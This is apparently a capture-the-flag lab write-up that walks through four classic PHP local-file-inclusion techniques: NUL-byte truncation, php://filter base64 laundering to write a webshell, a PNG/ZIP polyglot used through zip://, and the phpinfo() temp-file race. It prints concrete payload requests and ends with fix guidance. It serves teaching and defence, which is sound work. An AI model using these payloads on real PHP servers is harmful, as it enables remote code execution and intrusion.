# 20 — The LFI Classic Toolkit — Writeup

## TL;DR

Four pre-filter-chain LFI techniques, in the order history invented them.
A NUL byte truncates a hard-coded `.php` suffix on PHP 5.3.3 and is rejected
by 5.3.4 — the lab ships both interpreters so you can watch it die.
`php://filter/write=convert.base64-decode` digests a guard line that cannot be
removed and turns a file with no `<?` in it into executable PHP. A PNG that is
also a ZIP defeats the same `.php` suffix with `zip://photo.png#shell.php`.
Finally, `phpinfo()` prints `/tmp/phpXXXXXX` and refusing to read the response
keeps that file alive for over a minute, which is all the "race" ever needed.

Flag: `PHRACK{nul_bytes_died_but_tmp_files_never_will}`

## The bug

Four bugs, one per exhibit, all reachable from the outside, all of them the
same shape: a path or a file content that the developer believed was
constrained.

```php
// exhibit 1 and exhibit 3 - the extension is ours, the rest is yours
include($page . '.php');

// exhibit 2 - a note may not contain PHP, and every note starts with a guard
define('GUARD', "; <?php exit; ?> DO NOT REMOVE THIS LINE\n");
if (preg_match('/<\?|<%|<script/i', $body)) { die('refused'); }
file_put_contents($file . '.php', GUARD . $body);

// exhibit 4 - a diagnostic loader that cannot traverse and cannot pick up
// anything you uploaded, because everything you can write has a dot in it
if (strpos($path, '.') !== false) { die('no dots'); }
include($path);
```

The environment is deliberately hostile to every *other* trick:

| setting | value | effect |
|---|---|---|
| `allow_url_fopen` | `Off` | no remote streams |
| `allow_url_include` | `Off` | no RFI, no `data://` |
| `session.upload_progress.enabled` | `Off` | lab 11's primitive is gone |
| `file_uploads` | `On` | exhibits 3 and 4 need it — and that is the point |
| `/flag.txt` | `0400 root:root` | reading a file is not enough; `/readflag` is setuid |

`php://` and `zip://` walk straight through `allow_url_include = Off`, because
neither is flagged as a URL wrapper in php-src (`php_stream_wrapper.is_url == 0`).
Observed, not assumed: every payload in this lab ran with both settings `Off`.

### Why two containers

Exhibit 1's NUL byte only works on PHP < 5.3.4, and exhibits 2–4 are only
interesting because they still work on a *current* interpreter. So the same
`challenge/src/` tree is built twice:

* `challenge` — `php:8.2.33-apache` (+ `ext/zip`), port 8020, all four exhibits.
* `legacy` — Debian + Apache serving the same source through **two** CGI
  binaries compiled from `museum.php.net`, pinned by SHA-256:
  PHP **5.3.3** at `/` and PHP **5.3.4** at `/v534/`, port 9020.

## Building the exploit

### The historical arc, in one paragraph

Early LFI-to-RCE was a hunt for *files you control*: server logs poisoned
through the User-Agent, `/proc/self/environ`, mail spools, session files, and —
most reliably of all — the temporary file PHP writes for every upload. In
parallel ran a hunt for *ways past the application's own restrictions*: a
hard-coded `.php` suffix, an extension whitelist, a content filter. Truncation
was the first answer to the second problem and it was blunt enough that PHP
simply removed it: the NUL byte in 5.3.4, and over-long paths never really
worked on Unix at all. What replaced it was the wrapper: `php://filter` to
launder content past a check, `zip://` and `phar://` to hide a `.php` inside a
`.png`. And what finally made the temporary-file hunt practical was Brett
Moore's observation that `phpinfo()` will simply tell you the filename, so you
do not have to guess it — which is where this lab ends and lab 11 begins.

### Stage 1 — truncation against a fixed `.php`

`include($page . '.php')` concatenates in PHP, but the result eventually
becomes a C string handed to `open(2)`. Send a NUL and the suffix never
reaches the kernel:

```
GET /stage1.php?page=%2Fopt%2Fmuseum%2Fkeys%2Fstage1.key%00
```

Run against the three interpreters the lab ships:

```
php 5.3.3  (legacy wing)  NUL byte truncates -> k1-nulbyte-8f2a41d0
php 5.3.4  (legacy wing)  NUL byte rejected
php 8.2.33 (modern wing)  NUL byte rejected
```

**What killed it.** PHP 5.3.4's NEWS, 2010-12-09:

> Paths with NULL in them (foo\0bar.txt) are now considered as invalid. (Rasmus)

Concretely, `main/fopen_wrappers.c` — the resolver `include`/`require` go
through — gained four lines that are not in 5.3.3:

```c
PHPAPI char *php_resolve_path(const char *filename, int filename_length, const char *path TSRMLS_DC)
{
    ...
    if (strlen(filename) != filename_length) {
        return NULL;
    }
```

The same guard was copied into ~30 call sites in `ext/standard/file.c`
(`fopen`, `file_get_contents`, `unlink`, `tempnam`, …) in the same release.
Diffing the two tarballs shows exactly that and nothing else on this subject.

**The other half of the folklore does not reproduce.** Every LFI cheat sheet
also lists "make the path longer than `PATH_MAX` and the `.php` falls off":

```
?page=/opt/museum/keys/stage1.key/././././././…   (past 4096 bytes)
```

It does not work here, and the source says why. `TSRM/tsrm_virtual_cwd.c`:

```c
CWD_API int virtual_file_ex(cwd_state *state, const char *path, ...)
{
    int path_length = strlen(path);
    ...
    if (path_length == 0 || path_length >= MAXPATHLEN-1) {
        errno = EINVAL;
        return 1;                 /* not truncation - outright failure */
    }
```

That guard is present in PHP **5.3.3, 5.2.17, 5.1.6 and 4.4.9** (checked in the
museum tarballs). The truncation people remember — `copy_len = len > MAXPATHLEN-1 ?
MAXPATHLEN-1 : len` in `expand_filepath()` and `tsrm_realpath()` — can only fire
when the *resolved* path is longer than the input, which for an absolute path
never happens, and for a relative path is pre-empted by a second guard
(`path_length + state_cwd_length + 1 >= MAXPATHLEN-1 → return 1`). And a path
short enough to get through has its `/.` components collapsed lexically, so
there is nothing left to truncate.

Measured, inside the container, with the interpreters the lab ships:

```
$ php-cgi -q -f trunctest.php        # six payload shapes x lengths 40..9000
no win abs/slashdot (40..9000)       # key/./././…
no win abs/dot      (40..9000)       # key.........
no win abs/slash    (40..9000)       # key/////////
no win abs/reinject (40..9000)       # key/../opt/museum/keys/stage1.key…
no win rel/slashdot (40..9000)
no win rel/dot      (40..9000)
control NUL: WIN                     # php 5.3.3
control NUL: no                      # php 5.3.4
```

`solve.py` re-runs one over-long-path probe on every run so the claim stays
falsifiable. The surviving references for this trick are Windows-centric
(`MAX_PATH` is 260 and the Win32 path normaliser strips trailing dots and
spaces — the same family of behaviour lab 09 explores). **This lab does not
test Windows and does not claim it works there.**

### Stage 2 — loose base64 decoding in `php://filter`

Stefan Esser's Piwik advisory (Full Disclosure, 2009-12-09) is usually
remembered as an `unserialize()` bug, but the part the Phrack article cites is
the payload delivery. Piwik protected its writable config files with a guard
line — `; <?php exit; ?> DO NOT REMOVE THIS LINE` — so that a config file that
somehow got executed would do nothing. Esser pointed out that if you can
influence the *filename* being written, you can write through a filter:

> By crafting a configuration filename like
> `php://filter/write=convert.base64-decode/resource=/var/www/x.php` it is
> possible to channel all writes to the file through a base64 decoder. Because
> PHP does ignore invalid characters during base64 decoding it is possible to
> destroy the show stopper by a single base64 decoding.

The museum's note keeper is that bug with the `unserialize()` removed. It
refuses any body containing `<?`, and always prefixes the guard. Both defences
are defeated by the same filter, because `convert.base64-decode` skips every
byte outside `A-Za-z0-9+/` and then consumes what is left four characters at a
time.

Only 26 characters of the 42-byte guard line are in the alphabet:

```
"; <?php exit; ?> DO NOT REMOVE THIS LINE\n"   ->   "phpexitDONOTREMOVETHISLINE"
```

26 ≡ 2 (mod 4), so two characters of padding put our payload on a group
boundary. Everything before it decodes to 21 bytes of noise, which `include()`
happily emits as plain text before reaching `<?php`:

```
body   = "AA" + base64('<?php echo "K2:" . @file_get_contents("/opt/museum/keys/stage2.key"); ?>  ')
file   = GUARD . body
decode = a6 1a 5e c6 2b 43 38 d3 93 44 43 0e 54 44 c7 21 22 c8 34 40 00  <?php echo "K2:" …
```

Two details matter. The payload is padded with spaces until its length is a
multiple of 3, so its base64 carries no `=`; a stray `=` in the middle of the
stream makes `php_conv_base64_decode_convert()` report a fatal conversion error
and the whole bucket is dropped (labs 11 and 12 lean on the same behaviour).
And `solve.py` brute-forces the two padding characters rather than hardcoding
them, rejecting any choice whose noise prefix contains a `<`.

```
POST /stage2.php
file=php://filter/write=convert.base64-decode/resource=notes/phrack20
body=AAPD9waHAgZWNobyAiSzI6IiAuIEBmaWxlX2dldF9jb250ZW50cyg…

GET /stage2.php?note=phrack20
→ K2:k2-base64-5c7e93ab
```

The application never accepted a PHP tag and never wrote a file without the
guard. It still wrote a webshell.

### Stage 3 — `zip://` against the same fixed `.php`

CODEGATE 2015's "Owlur" had an upload that checked the extension but not the
content, and an include of the form `include(null_filter($var) . ".php")`.
Both halves are reproduced here: the photo wall checks the filename against
`/\.png$/i` **and** runs `getimagesize()` on the bytes, and its viewer appends
`.php`.

A PNG and a ZIP can be the same file: PNG is parsed from the front, ZIP from
the back (the reader finds the end-of-central-directory record by scanning
backwards). One subtlety that has changed since 2015 — the naive recipe does
not work any more:

```
variant B: cat photo.png shell.zip > x.png
           getimagesize -> image/png      ZipArchive::open -> 19 (ER_NOZIP)
           file_get_contents("zip://x.png#shell.php") -> false

variant A: append the archive in "a" mode so the central directory offsets
           count from the start of the *file* (the self-extracting layout)
           getimagesize -> image/png      ZipArchive::open -> true
           file_get_contents("zip://x.png#shell.php") -> "<?php …"
```

Modern libzip validates that the stored central-directory offset matches where
the directory actually is, so the offsets have to be fixed up. `zipfile.ZipFile(buf, "a")`
over a BytesIO that already contains the PNG does exactly that for free.

Then the suffix the application adds becomes the entry name inside the archive:

```
GET /stage3.php?view=zip%3A%2F%2Fuploads%2F19fd…fa.png%23shell
                       ^ the app appends ".php" -> #shell.php
→ K3:k3-zipwrap-1d6b04fe
```

with `allow_url_include = Off` the whole time, because the zip wrapper is
registered with `is_url = 0`.

### Stage 4 — the RFC1867 temp-file race, with `phpinfo()` assistance

PHP writes every uploaded part to `upload_tmp_dir` as `/tmp/phpXXXXXX` (six
characters from `mkstemp`) *before* the script runs, and unlinks it during
request shutdown. Two problems: you do not know the name, and it exists for
milliseconds. Brett Moore's 2011 paper solves both — `phpinfo()` prints
`$_FILES`, so the same request that creates the file also tells you its name,
and if the response is big enough the request is still running when you read
it.

The curator's desk is exactly that: `phpinfo()` behind a key, plus a loader
that includes any path with no dot in it. Nothing you can write has a dotless
name — notes become `notes/x.php`, photos become `<sha1>.png` — but
`/tmp/phpAbCdEf` has no dot at all.

**Where the padding has to go.** `php_print_info()` emits the variables in a
fixed order: `_REQUEST`, `_GET`, `_POST`, `_FILES`, `_COOKIE`, `_SERVER`,
`_ENV`. Only padding that lands in `_COOKIE`/`_SERVER` is printed *after* the
temporary filename. Request headers land in `_SERVER` as `HTTP_*`, and Apache's
defaults allow 100 headers of 8190 bytes each — so 90 headers of 7900 bytes
buys about 700 KiB of output after `$_FILES`. (Each header is echoed three
times in a full `phpinfo()`: in mod_php's "Apache Environment" table, in its
"HTTP Headers Information" table, and finally in `_SERVER`. Only the third
copy is on our side of the temporary filename — measured byte offsets in one
response: `_REQUEST` 65716, `_FILES['diag']` 65956, `/tmp/php…` 66108,
padded `_SERVER` entry 66488.)

Measured on this image:

```
total phpinfo response with 90 x 7900 bytes of padding : 2 234 153 bytes
bytes read before "/tmp/phpXXXXXX" appears             : 1 499 420 bytes
remaining, unread                                      :   734 733 bytes
```

**How the race becomes a window.** The classic exploit throws threads at the
problem. It does not have to. The response is only "big" relative to the
socket buffers, so the trick is to make the buffers small: set `SO_RCVBUF` to
2048 *before* connecting, and the advertised TCP window stays tiny, the
server's send buffer never autotunes upward, and PHP blocks inside `write()`
in the middle of `phpinfo()`. Stop reading at the temporary filename and the
request simply never ends:

```
delay  0s -> still there
delay  1s -> still there
delay  5s -> still there
delay 15s -> still there
delay 30s -> still there
delay 60s -> still there
```

`max_execution_time` does not intervene: PHP's timer is `ITIMER_PROF` (CPU
time) on Unix, and a process asleep in `write()` burns none.

With the window open, the include is unhurried:

```
GET /stage4.php?key=k1-…:k2-…:k3-…&run=/tmp/phpaLia4J
→ MUSEUM-RCE:PHRACK{nul_bytes_died_but_tmp_files_never_will}
```

Reliability, measured container-to-container: **30/30 single attempts**, about
0.4 s each. `solve.py` still runs four threads and caps itself at 32 attempts
and 120 seconds, so a broken run fails instead of hanging.

**One environment caveat, measured.** The hold only works if TCP back-pressure
reaches PHP. Through Docker's published port (`127.0.0.1:8020`) it does not:
`docker-proxy` reads the container socket as fast as it can into a multi-megabyte
host-side buffer, PHP finishes the request long before the client sees
`$_FILES`, and the temporary file is gone. Measured **0/32** through the
published port (throttled *and* burst variants), **30/30** inside the compose
network. `make solve` and `make verify` run the solver in the network; the
failure message in `solve.py` says so.

## The exploit

`solve/solve.py`, Python 3 standard library only, four stages that must run in
order because stage 4 needs all three key fragments:

1. `stage1()` — fires the `%00` payload at PHP 5.3.3, 5.3.4 and 8.2.33 and
   prints which ones truncate, then probes the over-long-path variant once so
   the negative result in this writeup is re-checked every run.
2. `stage2()` — `loose_b64_decode()` is a model of PHP's decoder (skip,
   then four-at-a-time); it is used to pick the alignment padding and to
   simulate the whole write offline before anything is sent.
3. `stage3()` — `make_png_zip()` builds the polyglot with `zipfile` in append
   mode so the central directory offsets are absolute.
4. `stage4()` — `one_race()` opens a throttled socket, sends the padded
   multipart POST, reads only as far as `/tmp/phpXXXXXX`, then fires the
   include from a second socket while the first is still parked. Four threads,
   at most `rounds * threads` attempts, hard deadline 120 s.

```
$ make solve
[stage 1] OK - key fragment 1 = k1-nulbyte-8f2a41d0
[stage 2] OK - key fragment 2 = k2-base64-5c7e93ab
[stage 3] OK - key fragment 3 = k3-zipwrap-1d6b04fe
[stage 4] won on attempt #4 of at most 32 (4 thread(s), 1.8s)
FLAG: PHRACK{nul_bytes_died_but_tmp_files_never_will}
```

## Fixing it

```php
// 1. never concatenate user input into an include path
$pages = ['home' => 'pages/home.php', 'about' => 'pages/about.php'];
$page  = $pages[$_GET['page'] ?? 'home'] ?? null;
if ($page === null) { http_response_code(404); exit; }
include __DIR__ . '/' . $page;
```

* **An allowlist of keys, not a sanitiser of paths.** Every stage here beats a
  sanitiser: the NUL byte beats "we append `.php`", `zip://` beats "we append
  `.php`" *and* "it is a PNG", the dot filter beats nothing at all.
* **Reject `://` in anything that becomes a path**, before any other check.
  `allow_url_fopen`/`allow_url_include` do not cover `php://`, `zip://` or
  `phar://` — none of them is registered as a URL wrapper — so switching those
  two directives off buys you nothing against any stage of this lab.
* **Never write a file whose name comes from the request**, and if you must,
  resolve it with `realpath()` and check the prefix — a filter chain is not a
  filename.
* **A guard line inside the file is not a security control.** If the file can
  be written it can be written through a converter; if it can be included, the
  only real control is that it is not attacker-controlled.
* **Do not expose `phpinfo()`**, and set `expose_php = Off`. `phpinfo()` leaks
  the upload temp names, the exact build, `open_basedir`, `disable_functions`
  and every request header.
* **Keep uploads out of the include-able tree** and give them names the
  application generates; `move_uploaded_file()` into a directory that the web
  server cannot serve and the application never includes from.
* If you never use uploads, `file_uploads = Off` removes stage 4 entirely —
  which is precisely the configuration lab 12 starts from.

## Going further

* **Gynvael Coldwind's variant** (article ref [50]) removes the `phpinfo()`
  requirement on Windows: the temporary name is guessable there because of the
  DOS device/wildcard behaviour lab 09 covers, so the attacker brute-forces
  `/tmp/php??????` with wildcards instead of reading it. **Not implemented,
  not tested here** — this lab is Linux only.
* **Brute-forcing the temp name on Linux** is the other classic: `mkstemp`
  gives 62^6 ≈ 5.7·10^10 names, which is why nobody does it without the
  `phpinfo()` leak. Try it against exhibit 4 to see the difference.
* **`phar://` instead of `zip://`.** A phar stub is "everything up to
  `__HALT_COMPILER();`", so a PNG-prefixed phar is a valid archive with no
  offset fix-up at all, and `phar://` is also `is_url = 0`. Labs 14 and 15 use
  phar for deserialisation; using it purely as an archive wrapper here is left
  as an exercise. **Not implemented in `solve.py`.**
* **The write-filter chain.** Esser's advisory notes that later Piwik versions
  needed *five* stacked base64 decoders. Stacking `convert.base64-decode`
  five times on the write side, against a longer guard, is the same arithmetic
  lab 11 does on the read side.
* **The other classic file sources** the article alludes to — poisoned access
  logs, `/proc/self/environ` (only useful under CGI/FastCGI, where the request
  environment *is* the process environment), mail spools, `/proc/self/fd/N` for
  a body file nginx has already unlinked (hxp CTF 2021, lab 12's ancestor).
  **Not implemented here**; exhibit 4's dot filter blocks the log files by
  accident and `/proc/self/environ` is inert under mod_php, which was checked.
* **Level 0 is next.** Lab 11 is the moment this toolkit stopped being enough:
  `session.upload_progress` gives a *named*, attacker-controlled file with no
  race at all.

## References

* Orange Tsai, "The Art of PHP - My CTF Journey and Untold Stories!",
  *Phrack* #72, section 4.1 —
  <https://phrack.org/issues/72/the-art-of-php-my-ctf-journey-and-untold-stories>
* Stefan Esser, "Advisory 03/2009: Piwik Cookie unserialize() Vulnerability",
  Full Disclosure, 2009-12-09 — <https://seclists.org/fulldisclosure/2009/Dec/204>
* Brett Moore, "LFI With PHPInfo Assistance", Insomnia Security, 2011 —
  <https://insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf>
* Gynvael Coldwind, "PHP LFI to arbitrary code execution via rfc1867 file
  upload temporary files" —
  <https://gynvael.coldwind.pl/download.php?f=PHP_LFI_rfc1867_temporary_files.pdf>
* CODEGATE CTF Preliminary 2015, "Owlur" — <https://ctftime.org/task/1398>,
  writeups at
  <https://github.com/ctfs/write-ups-2015/tree/master/codegate-ctf-2015/web/owlur>
  and
  <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/CODEGATE/web/owlur>
* PHP 5.3.4 release notes ("Paths with NULL in them … are now considered as
  invalid") — <https://www.php.net/ChangeLog-5.php#5.3.4>
* PHP source, as shipped in the museum tarballs this lab compiles:
  `main/fopen_wrappers.c` (`php_resolve_path`, `expand_filepath`),
  `TSRM/tsrm_virtual_cwd.c` (`virtual_file_ex`), `ext/standard/filters.c`
  (`php_conv_base64_decode_convert`), `main/rfc1867.c`,
  `ext/standard/info.c` (`php_print_info`, `php_print_gpcse_array`).
* CVE-2006-7243 — the NUL-byte-in-path class, fixed in PHP 5.3.4.
